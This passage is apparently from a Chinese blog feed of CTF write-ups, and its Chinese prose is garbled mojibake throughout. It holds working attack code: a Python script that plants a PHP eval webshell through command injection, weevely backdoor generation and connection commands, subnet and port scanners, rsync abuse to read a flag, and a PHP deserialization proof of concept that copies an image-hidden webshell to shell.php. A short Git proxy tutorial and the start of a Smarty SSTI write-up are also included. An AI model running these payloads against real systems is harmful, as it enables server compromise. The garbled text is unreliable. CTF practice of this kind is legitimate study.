write_webshell():</span><br><span class="line">    filename &#x3D; [r&#39;&gt;echo\ \\&#39;, r&quot;&gt;\&#39;\&lt;\?php \\&quot;, r&#39;&gt;eval\(&#39;, r&#39;&gt;\$_POST\[c\]\)&#39;, r&quot;&gt;\;\&#39;\&gt;2.php&quot;]</span><br><span class="line">    for i in filename:</span><br><span class="line">        my_params &#x3D; &#123;</span><br><span class="line">            &#39;cmd&#39;: i</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">        print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">    cmd_list &#x3D; [&#39;ls -tr&gt;1.sh&#39;, &#39;sh 1.sh&#39;]</span><br><span class="line">    for i in cmd_list:</span><br><span class="line">        exec_cmd2(i)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    write_webshell()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure><ol start="3"><li>å°±å¯ä»¥æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡å°é©¬åˆ©ç”¨èšå‰‘ä¼ ä¸€ä¸ªå¤§é©¬ä¸Šå»(ps:è¿™é‡Œä½¿ç”¨çš„æ˜¯kaliè‡ªå¸¦çš„weevely3)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &#x2F;home&#x2F;hw&#x2F;æ¡Œé¢&#x2F;1.php</span><br></pre></td></tr></table></figure><ol start="4"><li>ç»“åˆæç¤ºpython3ä»¥åŠflagä¸åœ¨æ­¤serveï¼Œå¯ä»¥æƒ³åˆ°éœ€è¦å†…ç½‘æ¸—é€ï¼Œä½†æ˜¯tmd ifconfigç­‰æŸ¥ipçš„å‘½ä»¤éƒ½è¢«ç¦ç”¨äº†ï¼Œè¿™é‡Œå¯ç”¨cat /etc/hostsæˆ–è€… cat /proc/net/fib_trieæŸ¥çœ‹ï¼Œå¦å¤–åŒ…å«phpinfoé¡µé¢ä¹Ÿå¯æˆåŠŸæ‹¿åˆ°æœ¬æœºip</li></ol><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215224239332.png" alt></p><ol start="5"><li>ä½¿ç”¨weevely3è¿æ¥å¤§é©¬ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œ</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#x2F;sandbox&#x2F;0098771fc87704c388bc566c6cd8104b&#x2F;1.php pass</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸€ä¸ªip&amp;portæ‰«æçš„è„šæœ¬:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import telnetlib</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip):</span><br><span class="line">    server &#x3D; telnetlib.Telnet()</span><br><span class="line">    for port in [21, 22, 23, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 873, 1433, 3306, 3389, 5432, 6082, 6379, 7001, 7002, 8000, 9000,9090, 8080, 8081, 8089, 9090, 27017, 27018]:</span><br><span class="line">        try:</span><br><span class="line">            server.open(ip, port)</span><br><span class="line">            print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">        except Exception as err:</span><br><span class="line">            #print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip, port))</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            server.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_open(q):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            ip &#x3D; q.get_nowait()</span><br><span class="line">            get_ip_status(ip)</span><br><span class="line">    except queue.Empty as e:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; []</span><br><span class="line">    ip &#x3D; sys.argv[1:]</span><br><span class="line">    ip &#x3D; &quot;&quot;.join(ip)</span><br><span class="line">    args &#x3D; &quot;.&quot;.join(ip.split(&quot;.&quot;)[:-1])</span><br><span class="line">    for i in range(1, 256):</span><br><span class="line">        host.append(&quot;&#123;off1&#125;.&#123;off2&#125;&quot;.format(off1&#x3D;args, off2&#x3D;i))</span><br><span class="line">    q &#x3D; queue.Queue()</span><br><span class="line">    for ip in host:</span><br><span class="line">        q.put(ip)</span><br><span class="line">    threads &#x3D; []</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t &#x3D; threading.Thread(target&#x3D;check_open, args&#x3D;(q,))</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line"> </span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>ç®€æ˜“ç‰ˆæœ¬ç«¯å£æ‰«æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    with open(&#39;active_port.txt&#39;,&#39;at&#39;) as f:</span><br><span class="line">        for i in range(65535+1):</span><br><span class="line">            ip &#x3D; &#39;172.64.152.4&#39;</span><br><span class="line">            try:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+&#39;\n&#39;)</span><br><span class="line">            except socket.error:</span><br><span class="line">                pass</span><br><span class="line">        f.close()</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    foo()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ç»“æœå‘ç°ï¼Œ172.16.233.111å¼€æ”¾äº†80ï¼Œ873ï¼Œ9000ç«¯å£ï¼Œç»§ç»­å†™è„šæœ¬æ¢æµ‹80ç«¯å£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import urllib.request</span><br><span class="line">import time</span><br><span class="line">HEADERS &#x3D; &#123;&#39;user-agent&#39;: (&#39;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5)&#39;</span><br><span class="line">                          &#39;AppleWebKit&#x2F;537.36 (KHTML, like Gecko)&#39;</span><br><span class="line">                          &#39;Chrome&#x2F;45.0.2454.101 Safari&#x2F;537.36&#39;),</span><br><span class="line">           &#39;referer&#39;: &#39;http:&#x2F;&#x2F;172.16.233.111&#x2F;index.html&#39;,</span><br><span class="line">           &#39;X-Forwared-For&#39;: &#39;127.0.0.1&#39;</span><br><span class="line">           &#125;</span><br><span class="line">file &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;172.16.233.111:80&#x2F;&quot;, headers&#x3D;HEADERS)</span><br><span class="line"> </span><br><span class="line">data &#x3D; urllib.request.urlopen(file)</span><br><span class="line"> </span><br><span class="line">print(data.headers)</span><br><span class="line">print(data.read().decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215231542666.png" alt></p><p>è€é«˜åšçš„æ—¶å€™ç”¨net_curlå‘½ä»¤è¿›è¡Œæ¢æµ‹</p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200319134817242.png" alt></p><p>873å¯¹åº”Rsyncï¼Œ9000å¯¹åº”FPMã€‚æˆ‘ä»¬å…ˆè¯•è¯•9000çš„FPMæ¼æ´ã€‚</p><p>åˆ©ç”¨åœ¨Phithonç‰›ä¸€ç¯‡æ–‡ç« ï¼ˆ<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.htmlï¼‰ä¸­çš„è„šæœ¬ï¼ˆhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75ï¼‰è¯»å–ä¸€ä¸‹ç›®å½•" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.htmlï¼‰ä¸­çš„è„šæœ¬ï¼ˆhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75ï¼‰è¯»å–ä¸€ä¸‹ç›®å½•</a></p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233458653.png" alt></p><p>å‘ç°å­˜åœ¨flagï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»å–ã€‚åˆ©ç”¨rsyncå¯ä»¥è¯»å–flag</p><p>ç®€å•æ¥è¯´rsyncæ˜¯å¯ä»¥å®ç°å¢é‡å¤‡ä»½çš„å·¥å…·ï¼Œé»˜è®¤ç«¯å£ä¸º873</p><blockquote><p>rsyncå¯ä»¥å®ç°scpçš„è¿œç¨‹æ‹·è´(rsyncä¸æ”¯æŒè¿œç¨‹åˆ°è¿œç¨‹çš„æ‹·è´ï¼Œä½†scpæ”¯æŒ)ã€cpçš„æœ¬åœ°æ‹·è´ã€rmåˆ é™¤å’Œâ€ls -lâ€æ˜¾ç¤ºæ–‡ä»¶åˆ—è¡¨ç­‰åŠŸèƒ½</p></blockquote><p>è¿™é‡Œè¦å…³æ³¨çš„æ˜¯rsync daemonæ¨¡å¼</p><blockquote><p>rsync daemonæ˜¯å‘å¤–æä¾›æœåŠ¡çš„ï¼Œè¿™æ ·åªè¦å‘Šè¯‰äº†åˆ«äººrsyncçš„urlè·¯å¾„ï¼Œå¤–äººå°±èƒ½å‘ftpæœåŠ¡å™¨ä¸€æ ·è·å–æ–‡ä»¶åˆ—è¡¨å¹¶è¿›è¡Œé€‰æ‹©æ€§åœ°ä¸‹è½½</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è·å–rsyncå…è®¸è®¿é—®ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p><blockquote><p>rsync daemonæ˜¯â€rsync  â€“daemonâ€æˆ–å†åŠ ä¸Šå…¶ä»–ä¸€äº›é€‰é¡¹å¯åŠ¨çš„ï¼Œå®ƒä¼šè¯»å–é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯/etc/rsyncd.confï¼Œå¹¶é»˜è®¤ç›‘å¬åœ¨873ç«¯å£ä¸Šï¼Œå½“å¤–ç•Œæœ‰å®¢æˆ·ç«¯å¯¹æ­¤ç«¯å£å‘èµ·è¿æ¥è¯·æ±‚ï¼Œé€šè¿‡è¿™ä¸ªç½‘ç»œå¥—æ¥å­—å°±å¯ä»¥å®Œæˆè¿æ¥ï¼Œä»¥åä¸è¯¥å®¢æˆ·ç«¯é€šä¿¡çš„æ‰€æœ‰æ•°æ®éƒ½é€šè¿‡è¯¥ç½‘ç»œå¥—æ¥å­—ä¼ è¾“ã€‚</p></blockquote><p>æ ¹æ®è¿™ç¯‡æ–‡ç« ä»‹ç»çš„<a href="https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7220009.html#auto_id_0</a></p><p>é¦–å…ˆæŸ¥çœ‹<code>/etc/rsyncd.conf</code></p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215233930976.png" alt></p><p>å®šä¹‰äº†æ¨¡å—<code>src</code>ï¼Œè·¯å¾„ä¸­åŒ…å«flagï¼Œ<br> é‚£ä¹ˆå¯ä»¥ä½¿ç”¨å‘½ä»¤<code>rsync 127.0.0.1::src/7h1s_i5_f14g /tmp/</code>å°†flagå¤‡ä»½å‡ºæ¥</p><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215234020817.png" alt></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/12239018.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12239018.html</a></p><p><a href="https://www.youncyb.cn/?p=435" target="_blank" rel="noopener">https://www.youncyb.cn/?p=435</a></p><p>weevelyç”¨æ³•ï¼š<a href="https://www.cnblogs.com/yufusec/p/9245618.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9245618.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æ–¹å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gité…ç½®ä»£ç†</title>
      <link href="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
      <url>/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ç”±äºæœ¬åœ°git cloneä¸‹è½½é€Ÿåº¦æ…¢ï¼Œé…ç½®ä¸€ä¸‹gitä»£ç†åï¼Œé€Ÿåº¦ä¸‹è½½å¿«äº†å¾ˆå¤šã€‚</p><h3 id="æ­¥éª¤è¿‡ç¨‹"><a href="#æ­¥éª¤è¿‡ç¨‹" class="headerlink" title="æ­¥éª¤è¿‡ç¨‹"></a>æ­¥éª¤è¿‡ç¨‹</h3><ol><li>æœ¬åœ°ä»£ç†å·¥å…·çš„ç«¯å£æ˜¯10808ï¼Œåœ¨ <code>Git</code> å‘½ä»¤è¡Œè¾“å…¥ä»¥ä¸‹é…ç½®å…¨å±€ä»£ç†ï¼š</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//127.0.0.1æŒ‡çš„æ˜¯æœ¬åœ°ï¼Œ10808æŒ‡çš„æ˜¯ä»£ç†å·¥å…·è®¾ç½®çš„ç«¯å£</span><br><span class="line">git config --global http.proxy socks5://127.0.0.1:10808</span><br></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦é…ç½®å¥½</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global -e</span><br></pre></td></tr></table></figure><p>æ‰“å¼€åæœ‰å¦‚å›¾æ‰€ç¤ºï¼Œå³é…ç½®æˆåŠŸã€‚</p><p><img src="/2020/03/19/Git%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200319101136987.png" alt></p><ol start="3"><li>å–æ¶ˆä»£ç†ä½¿ç”¨å‘½ä»¤</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> gitä»£ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-webåˆ·é¢˜ï¼ˆäºŒï¼‰</title>
      <link href="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-å¼ºç½‘æ¯-2019-Upload"><a href="#0x-01-å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="0x 01 å¼ºç½‘æ¯ 2019]Upload"></a>0x 01 å¼ºç½‘æ¯ 2019]Upload</h3><ul><li><p>è€ƒç‚¹</p><p>ä»£ç å®¡è®¡ï¼ŒPHP ååºåˆ—åŒ–</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>ç›®å½•æ‰«æå‘ç° /<a href="http://www.tar.gzæ•æ„Ÿæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ï¼Œå­˜åœ¨" target="_blank" rel="noopener">www.tar.gzæ•æ„Ÿæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ï¼Œå­˜åœ¨</a> .idea ç›®å½•ï¼Œæ‹–å…¥PhpstromæŸ¥çœ‹ï¼Œå‘ç°å­˜åœ¨ä¸¤å¤„æ–­ç‚¹,çŒœæµ‹æ˜¯å‡ºé¢˜äººçš„æç¤º</li></ol><p>application/web/controller/Index.phpï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319110910722.png" alt></p><p>application/web/controller/Register.phpï¼š</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319111027954.png" alt></p><ol start="2"><li>å®¡è®¡ä»£ç å‘ç°ï¼šâ‘ Register.phpæ³¨å†Œï¼Œæœ‰<strong>destruct()å‡½æ•°ï¼Œæƒ³åˆ¤æ–­æ³¨æ²¡æ³¨å†Œï¼Œæ²¡æ³¨å†Œçš„ç»™è°ƒç”¨ check ä¹Ÿå°±æ˜¯ Index çš„ index æ–¹æ³•â‘¡Index.phpï¼Œæœ€ä¸»è¦çš„å°±æ˜¯login_checkå‡½æ•°ï¼Œå¹¶ä¸”å‘ç°å…¶ä»–å‡½æ•°æ‰§è¡Œå‰ä¸€èˆ¬éƒ½ä¼šè°ƒç”¨è¿™ä¸ªï¼Œåº”è¯¥æ˜¯æ£€æŸ¥æœ‰æ²¡æœ‰ç™»é™†ï¼Œæœ€å…³é”®çš„æ˜¯æŠŠcookie(â€˜userâ€™)ååºåˆ—åŒ–äº†ï¼Œæ‰€ä»¥payloadåº”è¯¥æ”¾åœ¨cookie(â€˜userâ€™)é‡Œã€‚â‘¢Profile.phpï¼Œå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œæœ‰__</strong>get,__callæ–¹æ³•<br><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112709035.png" alt></li></ol><p>åœ¨upload_imgæ–¹æ³•ä¸­</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112809487.png" alt></p><p>å…ˆlogin_checkæ£€æŸ¥ç™»é™†ï¼Œç„¶ååˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™å°†æ–‡ä»¶ä¿¡æ¯èµ‹å€¼ç»™<br> $this-&gt;filename_tmpï¼Œå°†æ–‡ä»¶åmd5åŠ å¯†å¹¶æ‹¼æ¥pngèµ‹å€¼ç»™$this-&gt;filenameï¼Œè¿›å…¥ext_checkåˆ¤æ–­åç¼€æ˜¯å¦ä¸ºpngï¼Œå°†ç»“æœç»™$this-&gt;ext</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319112855911.png" alt></p><ol start="3"><li>åˆ©ç”¨æ€è·¯ï¼šæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œç„¶åå°†filename_tmp=å›¾ç‰‡é©¬è·¯å¾„ï¼Œfilename=xxx.phpï¼Œç»è¿‡å¤åˆ¶ä¾¿å¯è¾¾åˆ°getshellï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•åœ¨ä¸ä¸Šä¼ æ–‡ä»¶çš„æƒ…å†µä¸‹è°ƒç”¨upload_img</li></ol><p>å›åˆ°å…¥å£å‡½æ•°ï¼š<br> Register::__destruct()è¿›å…¥ifï¼Œè°ƒç”¨$this-&gt;checkerçš„index()ï¼Œå°†$this-&gt;checker=new Profile()ï¼Œä¼šè°ƒç”¨Profile::_call:</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113057678.png" alt></p><p>é‚£ä¹ˆæ­¤æ—¶$this-&gt;name=indexï¼Œ$argsä¸ºç©ºï¼Œè¿›å…¥ifçš„ä»£ç å°±å˜æˆäº†ï¼š<code>$this-&gt;index();</code></p><p>è°ƒç”¨äº†è¯¥ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡ï¼Œè§¦å‘_geté­”æœ¯æ–¹æ³•</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113233704.png" alt></p><p>_getä¼šè¿”å›$this-&gt;except[â€˜indexâ€™]ï¼Œä¹Ÿå°±æ˜¯$this-&gt;except<a href>â€˜indexâ€™</a>ï¼Œåªè¦å°†except[â€˜indexâ€™]=upload_imgå°±èƒ½è°ƒç”¨äº†</p><ol start="4"><li>å…ˆåˆ©ç”¨èšå‰‘ç”Ÿæˆwebshellï¼Œç„¶åä½¿ç”¨åå…­è¿›åˆ¶å·¥å…·å¤åˆ¶è¿›æ­£å¸¸å›¾ç‰‡çš„ç»“å°¾å¤„</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113647891.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319113557518.png" alt></p><p>æ³¨å†Œè´¦å·ä¸Šä¼ å›¾ç‰‡ï¼Œå¾—åˆ°å›¾ç‰‡è·¯å¾„</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114124209.png" alt></p><p>ç”Ÿæˆpoc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register&#123;</span><br><span class="line">public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#x2F;&#x2F;ç¡®ä¿è¿›å…¥if</span><br><span class="line">    $this-&gt;registed &#x3D; 0;</span><br><span class="line">        $this-&gt;checker &#x3D; new Profile();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $except;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    $this-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">    $this-&gt;filename_tmp &#x3D;&quot;.&#x2F;upload&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;4a47a0db6e60853dedfcfdf08a5ca249.png&quot;;</span><br><span class="line">    $this-&gt;filename &#x3D; &quot;.&#x2F;upload&#x2F;shell.php&quot;;</span><br><span class="line">    $this-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new Register()));</span><br></pre></td></tr></table></figure><p>å°†cookieæ›¿æ¢æˆç”Ÿæˆçš„ç»“æœï¼Œåˆ·æ–°é¡µé¢ï¼Œè®¿é—®shell.php</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319114414679.png" alt></p><p>è¿æ¥èšå‰‘ï¼Œå¾—åˆ°flag</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104374416" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104374416</a></p><p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p></blockquote><h3 id="0x-02-CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#0x-02-CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="0x 02 [CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>0x 02 [CISCN2019 åä¸œå—èµ›åŒº]Web11</h3><ul><li><p>è€ƒç‚¹</p><p>Smarty SSTI</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li><p>é¢˜ç›®æé†’<code>Build With Smarty</code>ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯<code>smarty ssti</code>ï¼Œå³ä¸Šè§’æ˜¾ç¤ºäº†<code>IP</code>ï¼ŒçŒœæµ‹æ³¨å…¥ç‚¹åº”è¯¥å†<code>X-Forwarded-For</code>3.1.30</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200319235007674.png" alt></p><ol start="2"><li>è®¾ç½®<code>X-Forwarded-For</code>ä¸º<code>{7+7}</code>ï¼Œåœ¨<code>current ip</code> 